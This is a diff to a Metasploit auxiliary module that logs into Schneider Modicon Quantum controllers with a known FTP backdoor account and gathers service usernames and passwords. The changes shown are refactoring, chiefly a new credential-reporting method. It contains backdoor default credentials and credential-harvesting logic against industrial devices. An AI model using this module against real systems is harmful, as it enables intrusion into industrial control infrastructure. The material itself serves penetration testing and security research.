@@ -1,11 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Ftp
   include Msf::Auxiliary::Report
 
@@ -37,12 +35,12 @@ class Metasploit3 < Msf::Auxiliary
         Opt::RPORT(21),
         OptString.new('FTPUSER', [true, "The backdoor account to use for login", 'ftpuser']),
         OptString.new('FTPPASS', [true, "The backdoor password to use for login", 'password'])
-      ], self.class)
+      ])
 
     register_advanced_options(
       [
         OptBool.new('RUN_CHECK', [false, "Check if the device is really a Modicon device", true])
-      ], self.class)
+      ])
 
   end
 
@@ -90,22 +88,49 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      last_attempted_at: Time.now,
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def setup_ftp_connection
     vprint_status "#{ip}:#{rport} - FTP - Connecting"
-    if connect_login()
-      print_status("#{ip}:#{rport} - FTP - Login succeeded")
-      report_auth_info(
-        :host => ip,
-        :port => rport,
-        :proto => 'tcp',
-        :user => user,
-        :pass => pass,
-        :ptype => 'password_ro',
-        :active => true
+    conn = connect_login
+    if conn
+      print_good("#{ip}:#{rport} - FTP - Login succeeded")
+      report_cred(
+        ip: ip,
+        port: rport,
+        user: user,
+        password: pass,
+        service_name: 'modicon',
+        proof: "connect_login: #{conn}"
       )
       return true
     else
-      print_status("#{ip}:#{rport} - FTP - Login failed")
+      print_error("#{ip}:#{rport} - FTP - Login failed")
       return false
     end
   end
@@ -123,7 +148,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def grab
-    logins = Rex::Ui::Text::Table.new(
+    logins = Rex::Text::Table.new(
       'Header'	=>	"Schneider Modicon Quantum services, usernames, and passwords",
       'Indent'	=>	1,
       'Columns'	=>	["Service", "User Name", "Password"]
@@ -218,5 +243,4 @@ class Metasploit3 < Msf::Auxiliary
     # )
     print_line logins.to_s
   end
-
 end
